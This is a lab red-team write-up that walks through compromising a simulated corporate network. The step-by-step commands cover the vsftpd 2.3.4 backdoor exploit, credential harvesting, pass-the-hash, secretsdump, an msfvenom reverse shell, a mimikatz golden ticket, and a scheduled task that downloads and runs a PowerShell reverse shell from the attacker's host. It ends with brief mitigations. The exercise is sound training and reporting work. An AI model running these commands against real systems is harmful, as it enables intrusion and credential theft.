# Red Team Engagement Simulation
A Red Team Engagement is a cybersecurity exercise designed to simulate real-world attacks and security breaches on an organization's systems, networks, and applications. The primary goal of a red team engagement is to identify vulnerabilities, weaknesses, and potential points of exploitation within an organization's defenses.

### **Initial Access: SCOPE of Engagement :**

## **[172.16.25.0/24](http://172.16.25.0/24) [ONLY 172.16.25.1 is out of scope]**

### Objective:

1. To pivot through a network by compromising a public facing web machine and tunnelling our traffic to access other machines in the network.
2. To reach the highest (**root/administrator**) level command execution.
3. To compromise the Child and Parent Domain

## My Attacker IP Address: 172.16.250.4

# Enumeration

Enumerating the given IP Ranges

```bash
nmap -sn 172.16.25.0/24 > ./Findings/nmap_172-16-25-0_24.txt
```

And resulted me to 3 IP Addresses

![Screenshot 2023-07-08 at 10 02 27 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/8ff9fa26-3482-458a-a0fa-9b08e3bf6715)

### Network Details

| External IP Address | Remarks | Description |
| --- | --- | --- |
| 172.16.25.1 | Out of Scope |  |
| 172.16.25.2 | 22 open ports | Production-Server |
| 172.16.25.3 | 4 open ports (with no port 80), but with RDP port open | child.redteam.corp/Employee-System |

Enumerating 172.16.25.2 using nmap scan, and had 22 open ports

```bash
nmap -A -sV -sT 172.16.25.3 > ./Findings/nmap_172-16-25-3.txt
```
## 172.16.25.2
![Screenshot 2023-07-08 at 10 08 45 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/558eb85f-3f68-4907-8501-e64dc5576d5d)
![Screenshot 2023-07-08 at 10 09 23 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/311127c7-9aef-4273-9cd8-8ecaf72b8fcc)
![Screenshot 2023-07-08 at 10 09 51 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/6e9fbae0-5269-478e-8a79-90547e17fb00)



## 172.16.25.3

```bash
nmap -A -sV -sT 172.16.25.3 > ./Findings/nmap_172-16-25-3.txt
```

We found 4 open ports and validates that this is windows machine where port 3389

![Screenshot 2023-07-08 at 10 04 54 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/66a80582-f15f-44f4-aef7-98aea672ef2e)

I will get back to this later, while I proceed on IP 172.16.25.2

## port 80 at 172.16.25.2

since port 80 is open, I look at http://172.16.25.2, a Registration page for Red Team Lab
![Screenshot 2023-06-28 at 9 32 04 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/4adf7b8a-9eb4-4b8c-bbeb-70e83c897a6d)

I tried the registration but it give us an error

![Screenshot 2023-06-28 at 10 13 38 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/d87d5ec4-8c5a-4c0a-819e-a138207c2e6d)
![Screenshot 2023-07-08 at 10 13 21 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/7add6faa-2133-41d2-a339-2b309e5fb9fb)


error after the registration

## vsftpd 2.3.4

Since I couldn’t get any information on port 80, I moved to the service running on port 21 which I believed vsftpd 2.3.4 has vulnerability.

![Screenshot 2023-07-08 at 10 14 41 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/17dfaad9-d40e-4fef-906d-03c21207cc5c)

| Vulnerability | System | CVSS Version 3.x | CVSS version 2.0 |
| --- | --- | --- | --- |
| CVE-2011-2523 vsftpd 2.3.4 | 172.16.25.2 | 9.8 Critical | 10.0 High |

Using metasploit, We look on possible use of the  vsftpd 2.3.4 service vulnerability.

![Screenshot 2023-07-08 at 12 23 21 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/43226b40-4f68-428a-a51e-b318bdab0641)

I found an exploit for vsftpd 2.3.4 which is a Backdoor Command Execution and can be used to the target machine. Selecting the module - exploit/unix/ftp/vsftpd_234_backdoor, and the setting up the following:

RHOSTS: 172.16.25.2

verbose: True

![Screenshot 2023-07-08 at 12 32 16 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/8e7c615f-1577-4e81-a722-4e77e0f6498b)
![Screenshot 2023-07-08 at 12 34 13 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/529f7fea-a8e4-481c-ae0a-12601a93de40)

Executing the exploit and a shell session was created, but this is not a interactive shell

![Screenshot 2023-07-08 at 12 35 08 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/14b01967-a3c3-44ef-b884-f2cb2da90ec2)

To have a interactive shell, I execute a terminal (tty) spawned via Python

```bash
python -c "import pty;pty.spawn('bin/bash')"
```

I got a root shell under the host-name Production-Server

## Production-Server

![Screenshot 2023-06-28 at 10 26 54 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/5175a55b-2e4f-4366-9f9a-62b3d4ec5cbf)

we got a root shell of Production-Server

From here I checked the /etc/passwd to check some interesting credentials

```bash
cat /etc/passwd
```
![Screenshot 2023-07-08 at 12 40 06 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/f6e54d66-7cab-47e5-9339-b5df246e09f2)


I found a a familiar credential

```bash
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
```

I look around to gather more interesting information. I found another user named “prod-admin”.

![Screenshot 2023-07-08 at 12 46 22 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/1dd2286e-aff7-41e2-a3ef-62e114ff1880)


## prod-admin

I navigate to home root directory and found 5 users folders. And look to the prod-admin folder and found a file named “credential.txt”

![Screenshot 2023-07-08 at 12 48 49 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/3a4bfbd4-66fc-4558-94d3-bb71ebf1025f)

```bash
cd prod-admin
ls
cat credential.txt
```
![Screenshot 2023-07-08 at 12 49 43 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/8fc23420-c34e-4596-9801-e614974d3289)

2 interesting credentials

| User Name | Password |
| --- | --- |
| support | support@123 |
| prod-admin | Pr0d!@#$% |

First, I try to login using the 1st credential - support:support@123. It doesn’t work

```bash
ssh support@172.16.25.2
```
![Screenshot 2023-07-08 at 12 56 23 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/14485c50-b23e-4913-ac42-c8bb0ad5b2e5)

Next, I go with trying the 2nd credential - prod-admin:Pr0d!@#$%. It does work

```bash
ssh prod-admin@172.16.25.2
```
![Screenshot 2023-07-08 at 12 59 25 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/669d3e8a-7384-4011-96b1-1157c0ccae8b)

So far this is the summary of what I got from the root directory enumeration of the Production-Server.

| User’s Directory | Remarks |  |
| --- | --- | --- |
| ftp | nothing interesting |  |
| msfadmin | nothing interesting |  |
| prod-admin | found credential.txt | Support User Credential = support:support@123 and Prod-admin Credential = prod-admin:Pr0d!@#$% |
| service | nothing interesting |  |
| user | nothing interesting |  |

# Pivoting

## IP 10.10.10.5 : Production-Server

Moving on, I conduct an initial enumeration inside the compromised Production-Server

Run a network card enumeration and found its internal ip address. Do a ping test on it and it is active.

![Screenshot 2023-07-08 at 1 03 52 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/750290d7-06ad-4959-b8d1-418b52f7fcd8)

Surprisingly nmap is working on the production server, I scanned the network to look for an ip range

```bash
nmap -sN 10.10.10.0/24
```
![Screenshot 2023-07-08 at 1 37 10 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/a173db41-300c-45e2-8c0c-5ef6d1c7b495)
![Screenshot 2023-07-08 at 1 37 33 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/c9039b22-a9d0-49b5-a42f-95bdb4eed595)

Found an IP range 10.10.10.1, 10.10.10.2, 10.10.10.3 and 10.10.10.4

### Network Details

| External IP Address | Description |
| --- | --- |
| 172.16.25.1 | Out of Scope |
| 172.16.25.2 | Production-Server |
| 172.16.25.3 | child.redteam.corp/Employee-System |
| Internal IP Address | Description |
| 10.10.10.1 | Reserved IP of the network |
| 10.10.10.2 | we suspect this as the Domain Controller |
| 10.10.10.3 | unknown |
| 10.10.10.4 | unknown |
| 10.10.10.5 | The compromised Production-Server (Ubuntu 8.04) |

From our gathered IP ranges we moved on our first target which is 10.10.10.3

## IP 10.10.10.3

With the compromised Production-Server, I setup my proxychains at 1080 to be able to run commands directly from my machine without touching the Production-Server.

![Screenshot 2023-07-09 at 8 32 11 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/f05c1a55-24f8-43ea-af68-d47a23eb66fb)

I run an nmap scan to 10.10.10.3 to find an open ports to attack with.

```bash
proxychains nmap -sV 10.10.10.3
```
![Screenshot 2023-07-09 at 7 51 11 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/c2d3bde0-1c77-4817-bad0-1677aeca6d4a)

Again I run some nmap scan to it

```bash
proxychains nmap -sC -A 10.10.10.3
```
![Screenshot 2023-07-09 at 8 00 12 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/1f56806f-56b4-4fe1-ab9f-0956d1803a2c)

Found 4 open ports with 2 high ports in it. Based on the protocol assigned to this 2 open ports, looks like these are web applications.

| Port | Description | Exploit |
| --- | --- | --- |
| 9090 | http / web application / Cockpit web service 162 - 188 | found some article related to its exploit |
| 10000 | http / web application / MiniServ 1.953 (Webmin httpd) | Unable to find any exploit on this version |

Before accessing these I setup a new proxy in firefox foxyproxy for port 1080

![Screenshot 2023-07-09 at 7 54 27 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/974148fd-6ee2-40e2-a2ab-1b6388031523)

I will check what’s on these ports by navigating through the following urls:

```bash
http://10.10.10.3:9090
http://10.10.10.4.10000
```
![Screenshot 2023-07-09 at 7 58 49 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/2ba75625-a984-456a-9c3a-5d1af1827483)

I found out that this url https://10.10.10.3:9090 is a server named Admin-System.

### Network Details

| External IP Address | Description |
| --- | --- |
| 172.16.25.1 | Out of Scope |
| 172.16.25.2 | Production-Server |
| 172.16.25.3 | child.redteam.corp/Employee-System |
| Internal IP Address | Description |
| 10.10.10.1 | Reserved IP of the network |
| 10.10.10.2 | we suspect this as the Domain Controller |
| 10.10.10.3 | Admin-System |
| 10.10.10.4 | unknown |
| 10.10.10.5 | The compromised Production-Server (Ubuntu 8.04) |

![Screenshot 2023-07-09 at 7 58 37 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/d8b170b8-f132-461c-8f16-5795be7983b4)

Both web services are running with TLS

| IP URLs | Web Applications |
| --- | --- |
| https://10.10.10.3:9090 | Cockpit web service 162 - 188 |
| https://10.10.10.3:10000 | MiniServ 1.953 (Webmin httpd) |

I run several login attempts on both the web, the only credentials that works is the support user’s credentials I found from credential.txt.

| UserID | Password |
| --- | --- |
| support | support@123 |

I used these credentials and I was able to login to the Cockpit Web Service.

![Screenshot 2023-07-08 at 3 52 15 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/b838ab2c-d796-4632-80d9-3e94fe6fc898)


Navigating to through the web application, I found a terminal tab

## Admin-System

Do some enumeration on this machine

![Screenshot 2023-07-09 at 9 01 55 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/f61ece25-d635-4ad3-b64e-88a3f6b15a20)

Looking into the terminal and execute some commands. I found out some interesting files inside the home directory of admin-sys. Interestingly I found a child-admin.keytab. From my research, A keytab is a file containing pairs of Kerberos principals and encrypted keys that are derived from the Kerberos password. You can use this file to log on to Kerberos without being prompted for a password.

![Screenshot 2023-07-09 at 9 03 57 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/f378206d-c675-4720-b613-c6409b318067)

Back to the terminal and try to look for some interesting files.

## krb5.keytab

Using the klist tool, found lots of entries **in the local credentials cache and key table.**

```bash
klist -k /etc/krb5.keytab
```
![Screenshot 2023-07-08 at 4 29 24 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/eff23401-7f79-4aca-9341-1579e1997d33)

Found 2 interesting credentials:

| Credentials |
| --- |
| administrator@CHILD.REDTEAM.CORP |
| Admin-System@CHILD.REDTEAM.CORP |

![Screenshot 2023-07-08 at 4 30 05 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/10568ef6-5f57-43ee-9da2-36c750b4ea51)

Back to our admin-sys directory, I was able to get to root access.

![Screenshot 2023-07-09 at 9 12 11 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/81f1d191-b8e1-44cd-89b4-acc48c90231f)

From my research, I can able to read the content of the child-admin.keytab using the tool KeyTabExtract.py. This means we need to download this keytab file.

## child-admin.keytab

```bash
scp child-admin.keytab USER@172.16.250.4:child-admin.keytab
```
![Screenshot 2023-07-09 at 9 54 22 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/2ea8a654-b1ff-4420-a96a-e7e31dfdbd81)

## KeyTabExtract.py

KeyTabExtract is a little utility to help extract valuable information from 502 type .keytab files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type and NTLM Hash.

![Screenshot 2023-07-08 at 5 35 41 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/a01b79ac-abf4-49bd-a96b-964888f6d617)

## child-admin NTLM HASH

Nice I had the child-admin NTLM HASH, we can possibly use this to login to our machines or extract information from other domain users.

```bash
NTML HASH: dbac2b57a73bb883422658d2aea36967
```

# Lateral Movement

## crackmapexec

Using CrackMapExec I will try to check if I can can collect Active Directory information to conduct lateral movement through the network. Since I assumes that 10.10.10.2 is possible domain controller IP, I execute the crackmapexec to it

```bash
proxychains poetry run crackmapexec smb 10.10.10.2 -u 'child-admin' -H :dbac2b57a73bb883422658d2aea36967
```

## child.redteam.corp\child-admin

Nice, I got the Pwn3d! and found out that 10.10.10.2 is the domain controller named RED-CHILDDC running on Windows Server 2016 Standard 14393 x64.

![Screenshot 2023-07-08 at 7 58 29 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/e271d793-fcb8-4edf-a020-8656b02e6fed)


| External IP Address | Description |
| --- | --- |
| 172.16.25.1 | Out of Scope |
| 172.16.25.2 | Production-Server |
| 172.16.25.3 | child.redteam.corp/EMPLOYEE-SYSTEM |
| Internal IP Address | Description |
| 10.10.10.1 | Reserved IP of the network |
| 10.10.10.2 | RED-CHILDDC |
| 10.10.10.3 | ADMIN-SYSTEM |
| 10.10.10.4 | unknown |
| 10.10.10.5 | The compromised Production-Server (Ubuntu 8.04) |

## psexec.py

Using the psexec.py, the child-admin hash and with our active proxy running on 1080. I will login to the Domain Controller IP address through the child-admin user.

```bash
proxychains psexec.py child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
```
![Screenshot 2023-07-08 at 8 07 11 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/b9d38488-5289-4b22-816c-46d55aca1baf)

There, I got successfully accessed it. 

```bash
net user /domain
```

Enumerating more further on the machine, I can see more domain users.

![Screenshot 2023-07-08 at 8 59 30 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/faf5d360-1ae4-4750-bc45-1300b5eb3bcb)

# Moving to DC

## secretsdump.py

To look more information on my target domain controller, I will use the secretsdump.py to extract **credentials and secrets from a system.**

```bash
proxychains secretsdump.py child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
```
![Screenshot 2023-07-08 at 8 23 21 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/fff29d6f-b936-4b0a-a217-95274e308f7d)

Great, I got the Administrator credential and other more machine part of this domain.

Also I got the krbtgt credentials as well.

![Screenshot 2023-07-08 at 8 28 08 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/be7978f3-9505-4f2d-bb5e-bd19d216051c)

## secretsdump.py -debug

Even more information I gathered using the -debug switch

```bash
proxychains secretsdump.py -debug child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
```
![Screenshot 2023-07-08 at 8 33 03 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/2eb42b2b-0ba2-4211-aebc-0925fe4667a0)
![Screenshot 2023-07-08 at 8 33 23 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/b5ff12fa-f7b4-4174-85f8-f01a0044f64f)
![Screenshot 2023-07-08 at 8 33 46 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/bf2d40de-4719-4331-8746-f9898c4c2528)
![Screenshot 2023-07-08 at 8 34 51 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/86cf4d92-e7e0-4fe2-a9d2-8de0f81d16db)
![Screenshot 2023-07-08 at 8 35 44 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/62f0e418-f9e4-4e64-bdb3-69e10e8ecc2a)
![Screenshot 2023-07-08 at 8 36 17 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/bd5e1676-9fb5-49a0-97a7-f3b331751ecb)
![Screenshot 2023-07-08 at 8 37 06 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/57857be6-cbfc-4d7a-b19e-cdbe998676e3)
![Screenshot 2023-07-08 at 8 37 52 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/1dbf824b-96ca-4eb5-981d-914dcdfb8f18)


Moving further to our enumeration, I will use the windows/shell_reverse_tcp and incognito.exe to spawn a reverse shell from our attacking machine.

## windows/shell_reverse_tcp - binary-jupin.exe and incognito.exe

Creating my reverse shell using msfvenom and send it to the compromised child-admin machine along with the incognito.exe

```bash
sudo msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=172.16.250.4 LPORT=443 -f exe -o binary-jupin.exe
```
![Screenshot 2023-07-08 at 8 55 06 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/7c1ffb1a-185c-4d34-9581-8b21a386a29a)
![Screenshot 2023-07-08 at 10 02 49 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/0abe1527-c531-416f-9050-2e3baf443935)

Execute the incognito.exe and my crafted reverse shell.

```bash
incognito.exe execute -c "child.redteam.corp\child-admin" C:\Users\Public\binary-jupin.exe
```

I got the shell listening on port 443 which I setup in my crafted reverse shell.

![Screenshot 2023-07-08 at 9 05 07 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/0e4763f7-b327-4ba2-9189-37bd504d0d4f)

Initiate enumeration on the spawned shell at port 443 and did get the same domain users information.

```bash
net user /domain
```
![Screenshot 2023-07-08 at 9 08 09 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/bfc61c3a-16e4-4568-ab1a-f2feaa2c8c62)

## mimikatz.exe

Now I will be using the mimikatz tool to extract more information connected to our compromised child-admin machine. Sending this to our compromised machine.

![Screenshot 2023-07-08 at 9 13 55 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/b563003e-a259-4206-865e-f5e130f67bb0)
![Screenshot 2023-07-08 at 9 14 06 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/f39a5e51-a213-49fe-8f75-a0182089b207)

Executes a mimikatz session. From the output, I only did get the SID of the child-admin and the NTLM Hash of RED-CHILDDC

![Screenshot 2023-07-09 at 11 27 17 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/5962a73c-b921-4d4b-a26f-a2afe4f3710f)

## child-admin SID

![Screenshot 2023-07-08 at 9 23 18 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/133dba18-af3e-4c3b-bff2-2c17efe3e109)

There is something missing in my enumeration approach. I forgot to use the powershell scripts.

## PowerView-Dev.ps1

Sending the copy of PowerView-Dev.ps1 to the compromised Domain Controller.

![Screenshot 2023-07-08 at 9 33 14 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/dfe0dde7-deed-45ec-8958-103ddf551747)
![Screenshot 2023-07-08 at 9 33 02 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/09f3b556-0b8c-4875-9be3-d1090f5f18d1)

Initiating the powershell and do the bypass

```bash
powershell -ep bypass
Get-Netcomputer | Select-Object cn
```

Found 4 machines connected to the domain controller.

![Screenshot 2023-07-08 at 9 40 08 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/075b6457-8b9a-43b6-9e4c-d8aeb7b98f54)

Back to mimikatz again. Using the SID of the child-admin and NTLM of the krbtgt, I will be forging my golden ticket to be able to access the domain controller fully.

## Golden Ticket

```bash
kerberos::golden /User:Administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902-500 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a startoffset:0 /endin:600 /renewmax:10080 /ptt
```
![Screenshot 2023-07-09 at 11 15 33 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/dd2d642c-9953-4aca-a2a2-a9ecc85c6e33)

Exiting from mimikatz, from here we know that our golden ticket is temporarily saved in the machine’s memory.

Moving on, initiate an enquiry if I can see the domain controller c$ directory.

```bash
PS > dir \\RED-CHILDDC.child.redteam.corp\c$
```

Great, this is the one I missed - “\\RED_CHILDDC.child.redteam.corp”

![Screenshot 2023-07-08 at 10 19 09 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/69d2ccdf-7688-4a72-bf42-c3e32d0d80f6)

Now we are creating a powershell TCP that would connect back to our attacking machine on port 4444.

## Invoke-PowerShellTcpOneLine.ps1

![Screenshot 2023-07-08 at 10 28 08 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/e91a12d8-111e-41fc-89f4-e8d73c93f724)

With all the information we gathered. From the compromised child-admin system, we schedule a task that will run on the domain controller. This task will initiate a download script of the copy of the Invoke-PowerShellTcpOneLine.ps1 running in our listener at port 80 of our attacking machine. The powershell script will spawn a shell on our attacking machine listening on port 4444.

```bash
schtasks /create /S RED-CHILDDC.child.redteam.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN "silver1" /TR
"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.250.4:4444/Invoke-PowerShellTcpOneLine.ps1''')'"
```

The schedule task is successful with task name “silver1”

![Screenshot 2023-07-08 at 10 40 10 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/3ca9a289-8dca-434c-8486-cf12c277b01a)

```bash
#this will transfer the Invoke-PowerShellTcpOneLine.ps1
sudo python3 -m http.server 80

#this is where the reverse shell will spawn at port 4444
sudo nc -lnvp 4444

#this will execute the schedule task "recent3"
schtasks /Run /S windows-sevrer.warfare.corp /TN "silver1"
```

Listening at port 80 where our Invoke-PowerShellTcpOneLine.ps1 is stored

![Screenshot 2023-07-08 at 10 43 10 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/4de3f90d-6c95-40ab-af12-518794de4eca)

Initiating the task from the child-admin machine.

```bash
schtasks /Run /S RED-CILDDC.child.redteam.corp /TN "silver1"
```

Task is successful

![Screenshot 2023-07-08 at 10 43 26 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/cf1e26e1-1943-4abe-b51c-2795c8972726)

In our listening port 4444, a shell has been spawned. Do the enumeration and we validated that this spawned shell is the domain controller itself running on IP address 10.10.10.2 with the hostname RED-CHILDDC

![Screenshot 2023-07-08 at 10 44 01 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/afed6da9-59e9-48c0-8310-e8b1dec690c1)

Now we completed our enumeration as follows.

| External IP Address | Description |
| --- | --- |
| 172.16.25.1 | Out of Scope |
| 172.16.25.2 | Production-Server |
| 172.16.25.3 | child.redteam.corp/EMPLOYEE-SYSTEM |
| Internal IP Address | Description |
| 10.10.10.1 | Reserved IP of the network |
| 10.10.10.2 | RED-CHILDDC |
| 10.10.10.3 | ADMIN-SYSTEM |
| 10.10.10.4 | DATABASE-SERVER |
| 10.10.10.5 | The compromised Production-Server (Ubuntu 8.04) |

# Conclusion

The red team engagement has shown that an external attacker can gain an initial foothold to the network by exploiting the public facing server (172.16.25.2). From there an attacker can compromise the entire network.

# Mitigation

1. Mitigating vulnerabilities and addressing outdated system patches is crucial to maintaining a secure environment. Remember that vulnerabilities are a common part of the IT landscape, but proactive and effective management can significantly reduce the risk they pose. Regularly review and adapt your mitigation strategies based on changes in your environment, emerging threats, and new technologies. On this case, the Production-Server [172.16.25.2]

| Vulnerability | System | CVSS Version 3.x | CVSS version 2.0 |
| --- | --- | --- | --- |
| CVE-2011-2523 vsftpd 2.3.4 | 172.16.25.2 | 9.8 Critical | 10.0 High |

2. Hardening Windows defenses against tools like Mimikatz and techniques associated with LOLBAS (Living Off The Land Binaries and Scripts) is crucial for improving the security of the systems. These tools and techniques are often used by attackers to compromise systems and gain unauthorized access to sensitive information.
